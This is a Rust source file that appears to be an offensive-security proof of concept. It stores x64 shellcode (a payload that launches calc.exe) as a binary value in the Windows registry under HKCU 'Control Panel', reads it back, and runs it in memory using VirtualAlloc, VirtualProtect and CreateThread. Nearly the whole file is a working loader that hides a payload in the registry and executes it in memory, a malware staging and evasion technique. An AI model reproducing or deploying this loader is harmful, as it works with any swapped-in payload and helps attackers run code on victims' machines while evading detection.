use std::{ffi::CString, intrinsics::copy_nonoverlapping, mem::transmute, os::raw::c_void, thread};

use winapi::um::{
    errhandlingapi::GetLastError, memoryapi::{VirtualAlloc, VirtualProtect}, processthreadsapi::CreateThread, synchapi::WaitForSingleObject, winnt::{
        KEY_SET_VALUE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, REG_BINARY,
    }, winreg::{
        HKEY_CURRENT_USER, RRF_RT_ANY, RegCloseKey, RegGetValueA, RegOpenKeyA, RegOpenKeyExA,
        RegSetValueExA,
    }
};

const REGISTRY: &str = "Control Panel";
const REGSTRING: &str = "Rusty";

fn write_to_registry(shellcode: &[u8], shellcode_size: usize) -> bool {
    let mut status = 0;
    let mut hkey = std::ptr::null_mut();

    let registry = CString::new(REGISTRY).unwrap();
    let regstring = CString::new(REGSTRING).unwrap();

    unsafe {
        println!(
            "[+] Writing {:x?} [Size: {}] to \"{}\\{}\"...",
            shellcode.as_ptr(),
            shellcode_size,
            REGISTRY,
            REGSTRING
        );

        status = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            registry.as_ptr() as *const i8,
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );

        if status != 0 {
            println!("[-] RegOpenKeyExA failed with error: {}", GetLastError());
            return false;
        }

        status = RegSetValueExA(
            hkey,
            regstring.as_ptr() as *const i8,
            0,
            REG_BINARY,
            shellcode.as_ptr(),
            shellcode_size as u32,
        );

        if status != 0 {
            println!("[-] RegSetValueExA failed with error: {}", GetLastError());
            return false;
        }

        if !hkey.is_null() {
            RegCloseKey(hkey);
        }
    }

    true
}

fn read_from_registry(shellcode: &mut [u8], shellcode_size: &mut usize) -> bool {
    let mut status = 0;
    let mut bytes_read = 0;
    let mut bytes: Vec<u8> = Vec::new();

    let registry = CString::new(REGISTRY).unwrap();
    let regstring = CString::new(REGSTRING).unwrap();

    unsafe {
        status = RegGetValueA(
            HKEY_CURRENT_USER,
            registry.as_ptr() as *const i8,
            regstring.as_ptr() as *const i8,
            RRF_RT_ANY,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut bytes_read,
        );

        if status != 0 {
            println!("[-] RegGetValueA failed with error: {}", GetLastError());
            return false;
        }

        bytes.resize(bytes_read as usize, 0);

        status = RegGetValueA(
            HKEY_CURRENT_USER,
            registry.as_ptr() as *const i8,
            regstring.as_ptr() as *const i8,
            RRF_RT_ANY,
            std::ptr::null_mut(),
            bytes.as_mut_ptr() as *mut winapi::ctypes::c_void,
            &mut bytes_read,
        );

        if status != 0 {
            println!("[-] RegGetValueA failed with error: {}", GetLastError());
            return false;
        }

        shellcode.copy_from_slice(bytes.as_slice());
        *shellcode_size = bytes_read as usize;
    }

    true
}

fn main() {

    let args = std::env::args().collect::<Vec<String>>();

    if args.len() != 2 {
        println!("Usage: {} <write|read>", args[0]);
        return;
    }

    let operation = &args[1];
    
    let buf: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    let shellcode_code = &mut [0u8; 276];
    let mut shellcode_size = 0;

    if operation == "write" {
        if write_to_registry(&buf, buf.len()) {
            println!("[+] Shellcode written to registry successfully!");
            return;
        } else {
            println!("[-] Failed to write shellcode to registry.");
        }
    } else if operation == "read" {
        if read_from_registry(shellcode_code, &mut shellcode_size) {
            println!("[+] Shellcode read from registry successfully!");
        } else {
            println!("[-] Failed to read shellcode from registry.");
        }

    } else {
        println!("Invalid operation. Use 'write' or 'read'.");
        return;
    }

    unsafe {
        let shellcode_address = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if shellcode_address.is_null() {
            println!("[-] VirtualAlloc failed with error: {}", GetLastError());
            return;
        }

        println!("[+] Allocated memory at: {:p}", shellcode_address);

        copy_nonoverlapping(
            shellcode_code.as_ptr(),
            shellcode_address as *mut u8,
            shellcode_size,
        );

        let mut old_protect = 0;

        let status = VirtualProtect(
            shellcode_address,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status == 0 {
            println!("[-] VirtualProtect failed with error: {}", GetLastError());
            return;
        }

        let thread_handle = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(shellcode_address)),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if thread_handle.is_null() {
            println!("[-] CreateThread failed with error: {}", GetLastError());
            return;
        }

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

    }
}
